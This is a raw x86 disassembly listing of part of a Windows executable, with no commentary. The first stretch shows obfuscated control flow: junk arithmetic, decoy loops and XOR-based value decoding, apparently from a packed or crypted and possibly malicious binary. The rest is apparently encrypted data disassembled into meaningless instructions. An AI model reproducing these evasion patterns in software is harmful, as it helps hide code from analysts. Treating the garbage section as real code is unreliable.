  412383:	mov    edx,DWORD PTR [ebp+0x8]
  412386:	and    DWORD PTR ds:0x426f09,0x423
  412390:	mov    ebx,DWORD PTR [ebp-0x4c]
  412393:	and    DWORD PTR ds:0x426ee1,0x67c7
  41239d:	add    edx,ecx
  41239f:	mov    DWORD PTR ds:0x426ee1,0x22dc
  4123a9:	or     edx,ebx
  4123ab:	and    DWORD PTR ds:0x426f2d,0x602a
  4123b5:	mov    DWORD PTR [ebp-0x4c],edx
  4123b8:	and    DWORD PTR ds:0x426e8d,edx
  4123be:	mov    edx,DWORD PTR [ebp+0x8]
  4123c1:	mov    DWORD PTR ds:0x426ee9,0x1e
  4123cb:	cmp    DWORD PTR ds:0x426ee9,0x0
  4123d2:	je     0x41241c
  4123d8:	cmp    DWORD PTR ds:0x426ee9,0xf
  4123df:	jl     0x41241c
  4123e5:	jmp    0x4123f0
  4123ea:	call   DWORD PTR ds:0x430a20
  4123f0:	cmp    DWORD PTR ds:0x426ee9,0x10
  4123f7:	jne    0x41240a
  4123fd:	mov    ebx,DWORD PTR ds:0x426ee9
  412403:	dec    ebx
  412404:	mov    DWORD PTR ds:0x426ee9,ebx
  41240a:	mov    ebx,DWORD PTR ds:0x426ee9
  412410:	dec    ebx
  412411:	mov    DWORD PTR ds:0x426ee9,ebx
  412417:	jmp    0x4123cb
  41241c:	mov    ebx,0xfdbe0321
  412421:	sub    ebx,edx
  412423:	sbb    edx,0x3018
  412429:	add    ebx,DWORD PTR [ebp-0x48]
  41242c:	sub    DWORD PTR ds:0x426e85,0x15fb
  412436:	mov    DWORD PTR [ebp-0x48],ebx
  412439:	mov    DWORD PTR ds:0x426f0d,0x10
  412443:	cmp    DWORD PTR ds:0x426f0d,0x0
  41244a:	je     0x4124a6
  412450:	cmp    DWORD PTR ds:0x426f0d,0x5
  412457:	jbe    0x4124a6
  41245d:	jmp    0x412478
  412462:	push   0x426000
  412467:	push   DWORD PTR [ebp-0x24]
  41246a:	push   DWORD PTR [ebp-0x14]
  41246d:	push   0x32fd
  412472:	call   DWORD PTR ds:0x430a24
  412478:	cmp    DWORD PTR ds:0x426f0d,0x6
  41247f:	jne    0x412494
  412485:	xor    ebx,ebx
  412487:	or     ebx,DWORD PTR ds:0x426f0d
  41248d:	dec    ebx
  41248e:	mov    DWORD PTR ds:0x426f0d,ebx
  412494:	mov    ebx,DWORD PTR ds:0x426f0d
  41249a:	dec    ebx
  41249b:	mov    DWORD PTR ds:0x426f0d,ebx
  4124a1:	jmp    0x412443
  4124a6:	mov    edx,DWORD PTR [ebp+0x8]
  4124a9:	mov    ebx,DWORD PTR [ebp-0x44]
  4124ac:	add    edx,edi
  4124ae:	add    DWORD PTR ds:0x426ee5,0x5ab2
  4124b8:	xor    edx,ebx
  4124ba:	xor    DWORD PTR ds:0x426ebd,0x426e81
  4124c4:	mov    DWORD PTR [ebp-0x44],edx
  4124c7:	and    DWORD PTR ds:0x426f05,0x0
  4124d1:	mov    edx,DWORD PTR ds:0x426f05
  4124d7:	inc    edx
  4124d8:	mov    DWORD PTR ds:0x426f05,edx
  4124de:	cmp    DWORD PTR ds:0x426f05,0x28
  4124e5:	jg     0x412506
  4124eb:	jmp    0x4124f9
  4124f0:	push   DWORD PTR [ebp-0x1c]
  4124f3:	call   DWORD PTR ds:0x430a28
  4124f9:	cmp    DWORD PTR ds:0x426f05,0x1d
  412500:	jb     0x4124d1
  412506:	mov    edx,DWORD PTR [ebp+0x8]
  412509:	xor    edx,eax
  41250b:	add    edx,esi
  41250d:	jne    0x41220b
  412513:	jmp    0x416e72
  412518:	mov    edx,DWORD PTR [ebp-0xc]
  41251b:	sub    edx,esi
  41251d:	xor    edx,eax
  41251f:	mov    DWORD PTR [ebp-0x5c],edx
  412522:	mov    edx,DWORD PTR [ebp-0x10]
  412525:	mov    ebx,DWORD PTR [ebp-0x8]
  412528:	xor    edx,eax
  41252a:	xor    ebx,eax
  41252c:	sub    edx,ebx
  41252e:	sub    edx,esi
  412530:	xor    edx,eax
  412532:	mov    DWORD PTR [ebp-0x10],edx
  412535:	mov    edx,DWORD PTR [ebp-0x14]
  412538:	mov    DWORD PTR [ebp+0x8],edx
  41253b:	jmp    0x4125b0
  412540:	mov    edx,DWORD PTR [ebp+0x8]
  412543:	mov    ebx,DWORD PTR [ebp-0x8]
  412546:	xor    edx,eax
  412548:	xor    ebx,eax
  41254a:	sub    edx,ebx
  41254c:	sub    edx,esi
  41254e:	xor    edx,eax
  412550:	mov    DWORD PTR [ebp+0x8],edx
  412553:	mov    edx,DWORD PTR [ebp+0x8]
  412556:	mov    ebx,DWORD PTR [ebp-0x58]
  412559:	lea    edx,[ebx+edx*1+0x5708f4]
  412560:	mov    DWORD PTR [ebp-0x58],edx
  412563:	mov    edx,DWORD PTR [ebp+0x8]
  412566:	mov    ebx,DWORD PTR [ebp-0x54]
  412569:	add    edx,0x64f89a
  41256f:	imul   edx,ebx
  412572:	mov    DWORD PTR [ebp-0x54],edx
  412575:	mov    edx,DWORD PTR [ebp+0x8]
  412578:	mov    ebx,DWORD PTR [ebp-0x50]
  41257b:	add    edx,0x242ebe9
  412581:	and    edx,ebx
  412583:	mov    DWORD PTR [ebp-0x50],edx
  412586:	mov    edx,DWORD PTR [ebp+0x8]
  412589:	mov    ebx,DWORD PTR [ebp-0x4c]
  41258c:	add    edx,ecx
  41258e:	or     edx,ebx
  412590:	mov    DWORD PTR [ebp-0x4c],edx
  412593:	mov    edx,DWORD PTR [ebp+0x8]
  412596:	mov    ebx,0xfdbe0321
  41259b:	sub    ebx,edx
  41259d:	add    ebx,DWORD PTR [ebp-0x48]
  4125a0:	mov    DWORD PTR [ebp-0x48],ebx
  4125a3:	mov    edx,DWORD PTR [ebp+0x8]
  4125a6:	mov    ebx,DWORD PTR [ebp-0x44]
  4125a9:	add    edx,edi
  4125ab:	xor    edx,ebx
  4125ad:	mov    DWORD PTR [ebp-0x44],edx
  4125b0:	mov    edx,DWORD PTR [ebp+0x8]
  4125b3:	xor    edx,eax
  4125b5:	add    edx,esi
  4125b7:	jne    0x412540
  4125bd:	jmp    0x414910
  4125c2:	push   esp
  4125c3:	pop    edi
  4125c4:	push   0x2e
  4125c6:	js     0x4125f6
  4125c8:	pop    eax
  4125c9:	imul   ebx,DWORD PTR [edx+0x12],0x66a67a6a
  4125d0:	pop    esi
  4125d1:	cld    
  4125d2:	sbb    BYTE PTR [ebx+0x7b],dh
  4125d5:	jnp    0x412588
  4125d7:	pushf  
  4125d8:	jnp    0x412655
  4125da:	ficom  DWORD PTR [esi+0x416309db]
  4125e0:	pop    ebx
  4125e1:	in     eax,dx
  4125e2:	ret    0x6e96
  4125e5:	or     al,0x65
  4125e7:	and    esp,eax
  4125e9:	aas    
  4125ea:	xchg   esi,eax
  4125eb:	and    ecx,DWORD PTR [eax-0x5f6f560e]
  4125f1:	sbb    eax,DWORD PTR [ebp+ebx*4-0x4fbd6c05]
  4125f8:	sub    ebp,DWORD PTR [edx+0x2e]
  4125fb:	dec    esi
  4125fc:	sbb    ecx,DWORD PTR cs:[ecx]
  4125ff:	jnp    0x41265b
  412601:	out    dx,eax
  412602:	jmp    0x6519:0xa3d0d3f6
  412609:	jnp    0x41262b
  41260b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41260c:	fs and ebp,esi
  41260f:	(bad)  
  412610:	shl    BYTE PTR [edx+eax*1-0x1d],1
  412614:	jge    0x4125ea
  412616:	mov    dl,0xd
  412618:	nop
  412619:	(bad)  
  41261a:	fnstcw WORD PTR [ecx-0x22]
  41261d:	jns    0x4125ca
  41261f:	hlt    
  412620:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412622:	nop
  412623:	arpl   WORD PTR [ecx+0x5a],si
  412626:	jne    0x41262d
  412628:	inc    eax
  412629:	cld    
  41262a:	gs sub eax,0x8f48aaa7
  412630:	mov    edi,ecx
  412632:	fwait
  412633:	test   eax,0xc47af426
  412638:	jle    0x4126b1
  41263a:	das    
  41263b:	aad    0x89
  41263d:	xchg   ecx,eax
  41263e:	mov    ds:0x74aa9953,eax
  412643:	xchg   edx,eax
  412644:	push   edi
  412645:	jns    0x4125f0
  412647:	dec    ebp
  412648:	jne    0x4126aa
  41264a:	push   0xffffffe0
  41264c:	aaa    
  41264d:	cdq    
  41264e:	sti    
  41264f:	ins    BYTE PTR es:[edi],dx
  412650:	jmp    0x2c4e:0x74db0666
  412657:	or     ecx,ecx
  412659:	adc    eax,DWORD PTR [ecx]
  41265b:	jmp    0x41265a
  41265d:	mov    al,ds:0x1cfa8f9f
  412662:	repz fstp st(0)
  412665:	xor    edi,DWORD PTR [esi]
  412667:	jl     0x41262b
  412669:	std    
  41266a:	cmc    
  41266b:	cmp    BYTE PTR [esi+0x4c],cl
  41266e:	adc    bl,dh
  412670:	inc    esi
  412671:	and    DWORD PTR [ecx],edx
  412673:	fwait
  412674:	(bad)  
  412675:	(bad)  
  412676:	repz mov ds:0x925e81ea,al
  41267c:	xchg   edx,eax
  41267d:	inc    ebx
  41267e:	outs   dx,BYTE PTR ds:[esi]
  41267f:	loop   0x41264d
  412681:	lds    ecx,FWORD PTR [esi-0x5e]
  412684:	sub    BYTE PTR [edi-0x38],0xf7
  412688:	cmp    esp,eax
  41268a:	sub    BYTE PTR ds:0x8380f418,al
  412690:	adc    bh,BYTE PTR [edx]
  412692:	arpl   WORD PTR [eax-0x12],ax
  412695:	and    eax,0x82dd0b7f
  41269a:	scas   eax,DWORD PTR es:[edi]
  41269b:	ret    0x1379
  41269e:	(bad)  
  41269f:	cmp    al,0xbe
  4126a1:	push   eax
  4126a2:	inc    ebx
  4126a3:	push   cs
  4126a4:	bound  ebx,QWORD PTR [ecx-0xb]
  4126a7:	ret    
  4126a8:	call   0x7d213dc4
  4126ad:	ror    bh,0xc7
  4126b0:	(bad)  
  4126b1:	(bad)  
  4126b3:	and    al,0x19
  4126b5:	cmp    al,0x49
  4126b7:	aad    0x7d
  4126b9:	iret   
  4126ba:	test   eax,0xcacc269b
  4126bf:	sub    bl,BYTE PTR [ebp+0x65]
  4126c2:	(bad)  
  4126c3:	jp     0x4126bd
  4126c5:	sbb    DWORD PTR [edx],0xffffff98
  4126c8:	and    DWORD PTR [eax-0x30],ecx
  4126cb:	or     BYTE PTR [esp+edx*2+0x44433ada],ch
  4126d2:	add    BYTE PTR [edx],bh
  4126d4:	fdivr  DWORD PTR [esi]
  4126d6:	call   0xcec16101
  4126db:	mov    esi,0xdf37df07
  4126e0:	sbb    BYTE PTR [ecx],dl
  4126e2:	cmp    cl,BYTE PTR [eax+0x8f5d3d8]
  4126e8:	loop   0x412729
  4126ea:	(bad)  
  4126eb:	or     al,0xdf
  4126ed:	xchg   ebx,eax
  4126ee:	cmc    
  4126ef:	xor    eax,0x59c7c0c
  4126f4:	cmp    bl,BYTE PTR [eax+eax*1]
  4126f7:	or     BYTE PTR [eax+eiz*2-0x14ed81e2],ch
  4126fe:	icebp  
  4126ff:	bound  esi,QWORD PTR [eax]
  412701:	xchg   edi,eax
  412702:	cmp    ah,BYTE PTR ds:0x21de7e28
  412708:	xchg   DWORD PTR [ebx+0x5aee11a3],ebp
  41270e:	pop    ecx
  412710:	es mov ch,0xb2
  412713:	sti    
  412714:	xchg   BYTE PTR [esi],bh
  412716:	call   0xdba0:0xe12cbf65
  41271d:	vcvtss2sd xmm2,xmm1,xmm6
  412721:	dec    ebx
  412722:	retf   0x8a46
  412725:	call   0x1328767e
  41272a:	mov    edx,0x1313c631
  41272f:	in     al,dx
  412730:	out    dx,eax
  412731:	pop    ss
  412732:	aas    
  412733:	js     0x4126ba
  412735:	out    0xde,eax
  412737:	pop    edx
  412738:	jb     0x412727
  41273a:	leave  
  41273b:	adc    al,0x68
  41273d:	xor    ebx,DWORD PTR [ebx+0x2a]
  412740:	adc    al,0x20
  412742:	cmc    
  412743:	mov    ds:0x8ae66f58,al
  412748:	fdivr  st,st(5)
  41274a:	pop    ss
  41274b:	sub    DWORD PTR [ebx-0x48],esp
  41274e:	or     eax,0xdf9bb8b0
  412753:	mov    bh,0x2f
  412755:	lea    esp,[ebp+0x5685a4ec]
  41275b:	jmp    0x836640a
  412760:	(bad)  
  412761:	adc    edi,DWORD PTR [ecx]
  412763:	dec    ebx
  412764:	dec    esp
  412765:	jecxz  0x41274d
  412767:	push   es
  412768:	xchg   esp,eax
  412769:	scas   al,BYTE PTR es:[edi]
  41276a:	cmp    dl,bl
  41276c:	clc    
  41276d:	jno    0x412706
  41276f:	mov    cl,0x96
  412771:	xchg   edx,eax
  412772:	push   ecx
  412773:	stc    
  412774:	add    DWORD PTR [esp+eax*8],0xa807b756
  41277b:	mov    ch,ah
  41277d:	mov    esp,ss
  41277f:	inc    DWORD PTR [ebx]
  412781:	addr16 (bad) 
  412784:	pushf  
  412785:	jmp    0x4127db
  412787:	mov    ebp,0xe6944144
  41278c:	outs   dx,DWORD PTR ds:[esi]
  41278d:	mov    al,ds:0xd30f7037
  412792:	mov    ebp,0x1d14bfb9
  412797:	mov    esp,0x8e817405
  41279c:	mov    dh,0xda
  41279e:	xchg   esp,eax
  41279f:	cld    
  4127a0:	pop    ebp
  4127a1:	xchg   edx,eax
  4127a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127a3:	or     DWORD PTR [esi+ebp*2+0x76ed2bd9],edx
  4127aa:	push   ebx
  4127ab:	mov    ah,BYTE PTR [eax+0x41]
  4127ae:	cwde   
  4127af:	and    BYTE PTR ds:0x90695405,bl
  4127b5:	(bad)  
  4127b6:	xchg   esp,eax
  4127b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127b8:	mov    cl,0x9c
  4127ba:	stos   DWORD PTR es:[edi],eax
  4127bb:	test   eax,0x46ed0447
  4127c0:	mov    DWORD PTR [edx+ebx*2-0x4e],ebx
  4127c4:	jl     0x4127e5
  4127c6:	inc    esi
  4127c7:	xchg   ecx,eax
  4127c8:	xor    eax,0x26eb14ef
  4127cd:	jbe    0x4127cb
  4127cf:	popf   
  4127d0:	jae    0x41276e
  4127d2:	gs pop ebx
  4127d4:	fcomp  QWORD PTR [esi+0x22039a7]
  4127da:	das    
  4127db:	lahf   
  4127dc:	mov    cs,WORD PTR [esi]
  4127de:	or     eax,0xa776e000
  4127e3:	call   0xb7cc:0x889a7552
  4127ea:	inc    edi
  4127eb:	mov    esi,0x7506d24f
  4127f0:	ds push 0x984e587d
  4127f6:	aad    0x93
  4127f8:	outs   dx,DWORD PTR ds:[esi]
  4127f9:	dec    edi
  4127fa:	jnp    0x41282c
  4127fc:	cmc    
  4127fd:	push   0xffffff90
  4127ff:	dec    esp
  412800:	mov    edi,0xc4ea542d
  412805:	jbe    0x4127e2
  412807:	xor    eax,0xdccbf546
  41280c:	sub    DWORD PTR [eax+0x63],0xffffffb9
  412810:	push   edi
  412811:	mov    al,0xeb
  412813:	mov    al,0x44
  412815:	idiv   BYTE PTR [esi-0x51f1a48a]
  41281b:	sub    eax,DWORD PTR [eax]
  41281d:	xchg   edx,eax
  41281e:	push   esi
  41281f:	and    bl,cl
  412821:	hlt    
  412822:	mov    ds:0xc5ef36e6,al
  412827:	sub    DWORD PTR [ecx+edx*4+0x65],0x23a9c9bc
  41282f:	(bad)  
  412830:	mov    esi,0x5e2f8a99
  412835:	in     eax,0xea
  412837:	icebp  
  412838:	(bad)  
  412839:	fs adc eax,0xb44e757a
  41283f:	inc    ecx
  412840:	mov    ds:0xe1c3b6a1,eax
  412845:	jecxz  0x41287c
  412847:	shr    BYTE PTR [ecx-0x50f5e5de],cl
  41284d:	mov    ecx,0x68cc9011
  412852:	sbb    bl,BYTE PTR [ebx]
  412854:	sbb    DWORD PTR [edi],esp
  412856:	les    esp,FWORD PTR [edx-0x647b38b0]
  41285c:	(bad)  [ecx+eiz*4-0x66fcdf78]
  412863:	mov    eax,0x5e1a160b
  412868:	je     0x412867
  41286a:	inc    eax
  41286b:	add    ebx,DWORD PTR [esi-0x6c]
  41286e:	(bad)  
  41286f:	sar    DWORD PTR [esi+ecx*4],cl
  412872:	or     al,0x11
  412874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412875:	mov    cl,BYTE PTR [esi+0xb]
  412878:	mov    dl,BYTE PTR [ebx-0x57]
  41287b:	dec    esp
  41287c:	xor    esp,DWORD PTR [ebx]
  41287e:	and    BYTE PTR [edx+eax*2+0x2d057223],al
  412885:	xchg   edi,eax
  412886:	add    DWORD PTR [edx+0x3b],esi
  412889:	sbb    eax,DWORD PTR [edx]
  41288b:	xchg   ah,dl
  41288d:	dec    edx
  41288e:	arpl   WORD PTR [ebp+0x3ea7f259],cx
  412894:	jne    0x41283f
  412896:	adc    al,0x86
  412898:	dec    edi
  412899:	sar    DWORD PTR [eax],cl
  41289b:	xchg   esp,eax
  41289c:	fcom   QWORD PTR [ecx-0x3e94c161]
  4128a2:	push   esi
  4128a3:	xchg   esi,eax
  4128a4:	sub    esp,edx
  4128a6:	and    eax,0x7f6a8c0d
  4128ab:	ret    0x2d5b
  4128ae:	lods   eax,DWORD PTR ds:[esi]
  4128af:	(bad)  
  4128b0:	jns    0x41283a
  4128b2:	es add esi,ebp
  4128b5:	jmp    0x9b7032c6
  4128ba:	mov    BYTE PTR [edx-0x3ea9542c],ch
  4128c0:	in     al,dx
  4128c1:	xor    al,0x66
  4128c3:	sub    esi,ebx
  4128c5:	and    DWORD PTR [ecx-0x7d0f43fa],edx
  4128cb:	(bad)  
  4128cc:	mov    gs,WORD PTR [edx-0x4372a287]
  4128d2:	jo     0x4128f0
  4128d4:	sbb    edi,DWORD PTR [esi]
  4128d6:	int3   
  4128d7:	lea    esp,[edi+0x33528327]
  4128dd:	fild   DWORD PTR [esi+0xa]
  4128e0:	jno    0x412919
  4128e2:	xchg   edi,eax
  4128e3:	popa   
  4128e4:	push   ss
  4128e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128e6:	fucomi st,st(2)
  4128e8:	icebp  
  4128e9:	mov    dh,0xf5
  4128eb:	cdq    
  4128ec:	add    al,0x7c
  4128ee:	add    DWORD PTR [ebx+0x7],edx
  4128f1:	inc    esi
  4128f2:	jne    0x4128c8
  4128f4:	xchg   edi,eax
  4128f5:	mov    dh,0x94
  4128f7:	test   DWORD PTR [ebx-0x61b159f2],edx
  4128fd:	adc    eax,0x89a51a5c
  412902:	pushf  
  412903:	and    dl,0x0
  412906:	xchg   DWORD PTR [eax],ebx
  412908:	dec    edi
  412909:	mov    ebx,0xb82543b4
  41290e:	pop    ebx
  41290f:	sti    
  412910:	lock hlt 
  412912:	fistp  QWORD PTR ds:0x2f434402
  412918:	test   esp,0x28b1c5d5
  41291e:	or     DWORD PTR [edx+0x6d207b15],0x730087de
  412928:	or     dh,BYTE PTR [ecx+0x21]
  41292b:	cld    
  41292c:	lds    ebx,FWORD PTR [ebx-0x1f8e2431]
  412932:	pop    ebx
  412933:	jle    0x412991
  412935:	sub    esi,ebx
  412937:	mov    bl,0x24
  412939:	push   cs
  41293a:	sub    eax,0xf0a24c73
  41293f:	fxch   st(1)
  412941:	inc    esi
  412942:	and    eax,0x95a31c3d
  412947:	scas   eax,DWORD PTR es:[edi]
  412948:	leave  
  412949:	sub    eax,0xba6e1c28
  41294e:	dec    esp
  41294f:	push   DWORD PTR [ebp+0x1457f487]
  412955:	or     ecx,DWORD PTR [ebx]
  412957:	cmc    
  412958:	xchg   edx,eax
  412959:	mov    ebp,0xc5e46834
  41295e:	test   DWORD PTR [edx-0x30],esi
  412961:	sbb    al,0xf4
  412963:	fs dec edi
  412965:	pop    eax
  412966:	test   edi,eax
  412968:	in     eax,dx
  412969:	xchg   BYTE PTR [esi+0xa34d323],ch
  41296f:	sbb    esi,DWORD PTR [eax-0x6b]
  412972:	push   0x9a2c6fb3
  412977:	inc    edi
  412978:	jb     0x41291d
  41297a:	test   al,0x6b
  41297c:	sbb    al,0xef
  41297e:	lea    ecx,[edi]
  412980:	js     0x41291a
  412982:	outs   dx,DWORD PTR ds:[esi]
  412983:	jne    0x41295a
  412985:	jecxz  0x412937
  412987:	mov    al,BYTE PTR [esi-0x4810df0e]
  41298d:	daa    
  41298e:	push   ebp
  41298f:	dec    esi
  412990:	and    eax,0xeabd9454
  412995:	aas    
  412996:	push   edi
  412997:	not    DWORD PTR ds:0xf66532ae
  41299d:	icebp  
  41299e:	out    0x42,al
  4129a0:	jl     0x41295f
  4129a2:	hlt    
  4129a3:	stc    
  4129a4:	push   edx
  4129a5:	inc    ebx
  4129a6:	mov    ah,dh
  4129a8:	enter  0xb3b8,0x5e
  4129ac:	mov    WORD PTR [ebp+0xfcf6944],?
  4129b2:	xchg   edx,eax
  4129b3:	shl    ecx,cl
  4129b5:	mov    dl,0x91
  4129b7:	ror    DWORD PTR [eax-0x6c],0x9a
  4129bb:	lods   al,BYTE PTR ds:[esi]
  4129bc:	cwde   
  4129bd:	add    eax,0x856f544e
  4129c2:	or     DWORD PTR [edi],eax
  4129c4:	jnp    0x41297e
  4129c6:	div    DWORD PTR [esi-0x7a]
  4129c9:	ret    0x697f
  4129cc:	js     0x412a4a
  4129ce:	or     ecx,DWORD PTR [eax+eax*4]
  4129d1:	(bad)  
  4129d2:	or     eax,0xcd6533f9
  4129d7:	push   ebx
  4129d8:	xchg   edx,eax
  4129d9:	sar    BYTE PTR [eax],0x81
  4129dc:	push   eax
  4129dd:	pop    ds
  4129de:	test   al,0xe3
  4129e0:	arpl   WORD PTR [edx-0x1cc0add],cx
  4129e6:	outs   dx,BYTE PTR ds:[esi]
  4129e7:	push   cs
  4129e8:	in     eax,dx
  4129e9:	jne    0x4129f5
  4129eb:	das    
  4129ec:	inc    DWORD PTR [edx]
  4129ee:	cmp    DWORD PTR [esi-0x3d],esi
  4129f1:	dec    edi
  4129f2:	imul   esp,DWORD PTR [ebx+0xa],0x14
  4129f6:	cmc    
  4129f7:	mov    dl,0x8f
  4129f9:	cs mov bl,0xc0
  4129fc:	xor    dl,BYTE PTR [ecx-0x3b57ff69]
  412a02:	(bad)  
  412a03:	popf   
  412a04:	test   DWORD PTR [ebp-0x6b313201],ebp
  412a0a:	adc    ebp,DWORD PTR [ebp-0x46]
  412a0d:	sbb    al,0x26
  412a0f:	pop    ds
  412a10:	pop    edx
  412a11:	imul   eax,DWORD PTR [eax-0xa4330d5],0x2d
  412a18:	sbb    eax,0x74a45170
  412a1d:	mov    gs,edx
  412a1f:	aas    
  412a20:	inc    eax
  412a21:	test   al,0x70
  412a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a24:	scas   eax,DWORD PTR es:[edi]
  412a25:	js     0x412a1f
  412a27:	sub    DWORD PTR ds:0x30e5f6b,esi
  412a2d:	rcl    DWORD PTR [edx],1
  412a2f:	iret   
  412a30:	mov    ah,0xa6
  412a32:	enter  0x5daf,0x76
  412a36:	(bad)  
  412a37:	call   0xa861:0x699b7420
  412a3e:	mov    al,0x14
  412a40:	call   DWORD PTR ds:0xf79893a4
  412a46:	es adc eax,0xca24a80a
  412a4c:	pop    ss
  412a4d:	mov    ch,0x4d
  412a4f:	icebp  
  412a50:	and    BYTE PTR [bx-0x2bf5],ch
  412a55:	shr    DWORD PTR ds:0x2b69c3a6,cl
  412a5b:	sbb    al,0xfc
  412a5d:	xchg   DWORD PTR [edx+eiz*1],esi
  412a60:	xlat   BYTE PTR ds:[ebx]
  412a61:	ret    
  412a62:	lods   eax,DWORD PTR ds:[esi]
  412a63:	jb     0x412a45
  412a65:	sbb    esp,DWORD PTR [edi-0x5d]
  412a68:	ds pop ecx
  412a6a:	xor    BYTE PTR [edx-0x78],0xca
  412a6e:	xor    ecx,edx
  412a70:	jmp    0xa474:0x3a18793b
  412a77:	jmp    0xf19a:0x5a5a011
  412a7e:	(bad)  
  412a7f:	or     al,0x90
  412a81:	int3   
  412a82:	fidivr WORD PTR [edx]
  412a84:	cdq    
  412a85:	pop    ebx
  412a86:	mov    DWORD PTR [ecx+0x11],edx
  412a89:	aas    
  412a8a:	inc    esp
  412a8b:	ds mov ebx,0xb559abfb
  412a91:	adc    cl,BYTE PTR [ebx-0x1e]
  412a94:	pop    edx
  412a95:	or     al,0x3
  412a97:	aad    0x24
  412a99:	call   0x8466:0xb74959da
  412aa0:	sub    DWORD PTR [esi-0x50],esp
  412aa3:	sti    
  412aa4:	sbb    ah,cl
  412aa6:	mov    WORD PTR [eax+0xff1cbe1],ds
  412aac:	xchg   esp,eax
  412aad:	push   ebp
  412aae:	or     ecx,DWORD PTR [ecx+0x537e8337]
  412ab4:	or     cl,BYTE PTR [ecx+0x29]
  412ab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ab8:	cmp    BYTE PTR [esi-0x1659315],cl
  412abe:	xchg   cl,ah
  412ac0:	inc    ebp
  412ac1:	iret   
  412ac2:	hlt    
  412ac3:	xor    eax,0x6be5a7b6
  412ac8:	repz popf 
  412aca:	xor    eax,0x12ec972e
  412acf:	xchg   edi,eax
  412ad0:	scas   al,BYTE PTR es:[edi]
  412ad1:	js     0x412a5b
  412ad3:	dec    eax
  412ad4:	adc    al,0x71
  412ad6:	inc    edx
  412ad7:	add    DWORD PTR [ebp-0x2b],edi
  412ada:	inc    ebx
  412adb:	jo     0x412acb
  412add:	ror    al,0xf4
  412ae0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ae1:	fisubr DWORD PTR [ecx+ebp*2]
  412ae4:	xchg   edx,eax
  412ae5:	mov    ecx,0xfe1d6c52
  412aea:	mov    ch,0x85
  412aec:	cdq    
  412aed:	shl    DWORD PTR [edi+0x3f],0x10
  412af1:	bound  ebp,QWORD PTR [eax-0x9]
  412af4:	ror    DWORD PTR [edx-0x2e],1
  412af7:	out    0x95,eax
  412af9:	mov    ebp,0xb56f6d98
  412afe:	mov    esi,DWORD PTR [eax+0x38]
  412b01:	mov    ds:0xf27c1db7,al
  412b06:	and    ebp,ebx
  412b08:	push   esp
  412b09:	ror    ecx,1
  412b0b:	cmp    DWORD PTR [eax],esp
  412b0d:	test   eax,0xffaf7cea
  412b12:	clc    
  412b13:	pop    edi
  412b14:	cli    
  412b15:	sub    eax,ebx
  412b17:	push   ds
  412b18:	fdivp  st(0),st
  412b1a:	pop    es
  412b1b:	out    dx,eax
  412b1c:	ror    BYTE PTR [ecx+ebx*2-0x56],0x7
  412b21:	icebp  
  412b22:	and    al,0xe2
  412b24:	jno    0x412ab5
  412b26:	aaa    
  412b27:	xchg   ecx,eax
  412b28:	mov    WORD PTR [ecx-0x278a8569],?
  412b2e:	or     DWORD PTR [esi+0x4d],esi
  412b31:	add    edx,DWORD PTR [eax]
  412b33:	mov    esi,0xd64a6393
  412b38:	pop    ecx
  412b39:	push   esi
  412b3a:	jns    0x412b4c
  412b3c:	push   esp
  412b3d:	lds    edx,FWORD PTR [eax+edx*1+0x556ee5a6]
  412b44:	int    0x8d
  412b46:	mov    ebp,DWORD PTR [esi+0x3871b0a]
  412b4c:	mov    eax,0xf1f8c398
  412b51:	out    0x35,eax
  412b53:	and    al,0xc9
  412b55:	xchg   edi,eax
  412b56:	call   FWORD PTR [edi]
  412b58:	jae    0x412b6c
  412b5a:	mov    esi,0xe6935e12
  412b5f:	cli    
  412b60:	sbb    cl,BYTE PTR [eax]
  412b62:	sbb    DWORD PTR [ebx],ebx
  412b64:	mov    eax,ds:0x1e88ca62
  412b69:	(bad)  
  412b6a:	jg     0x412b59
  412b6c:	hlt    
  412b6d:	xchg   esp,eax
  412b6e:	xor    BYTE PTR [edx-0x7c],0x66
  412b72:	xor    ecx,esi
  412b74:	jg     0x412b47
  412b76:	mov    ch,0x6b
  412b78:	lods   al,BYTE PTR ds:[esi]
  412b79:	popa   
  412b7a:	pop    esi
  412b7b:	mov    al,0xf0
  412b7d:	(bad)  
  412b7f:	push   0xffffff84
  412b81:	cmp    al,0x5c
  412b83:	into   
  412b84:	ffreep st(0)
  412b86:	pop    ecx
  412b87:	xchg   esi,eax
  412b88:	or     BYTE PTR [eax-0x2f],0xc7
  412b8c:	add    al,0x6b
  412b8e:	imul   esi,eax,0xffffff91
  412b91:	pop    es
  412b92:	jns    0x412b7f
  412b94:	repz rcl dl,cl
  412b97:	loopne 0x412bb0
  412b99:	pop    ds
  412b9a:	(bad)  ss:[esi-0x15d480b5]
  412ba1:	pop    ds
  412ba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ba3:	jnp    0x412b3e
  412ba5:	xchg   edi,eax
  412ba6:	(bad)  
  412ba7:	mov    eax,0xd9580f3c
  412bac:	out    dx,al
  412bad:	repnz dec ebx
  412baf:	adc    al,0x6f
  412bb1:	pop    es
  412bb2:	jo     0x412b9e
  412bb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bb5:	je     0x412b8d
  412bb7:	mov    ebx,DWORD PTR [ecx+edi*8]
  412bba:	popa   
  412bbb:	fidivr DWORD PTR [si]
  412bbe:	and    eax,0x1bd4984d
  412bc3:	pop    ds
  412bc4:	mov    esi,DWORD PTR [esi+0x7e98dd56]
  412bca:	iret   
  412bcb:	sbb    DWORD PTR [edi+0x3869f8d2],0x7ff31c74
  412bd5:	ret    
  412bd6:	xor    edi,DWORD PTR [ecx-0x7cfd396d]
  412bdc:	mov    bl,0x44
  412bde:	(bad)
  412be2:	dec    edi
  412be3:	sub    BYTE PTR [ebp-0x5ef8322a],ah
  412be9:	mov    dl,0xb
  412beb:	xor    cl,BYTE PTR [edx]
  412bed:	push   ebx
  412bee:	mov    al,0xa4
  412bf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bf1:	fwait
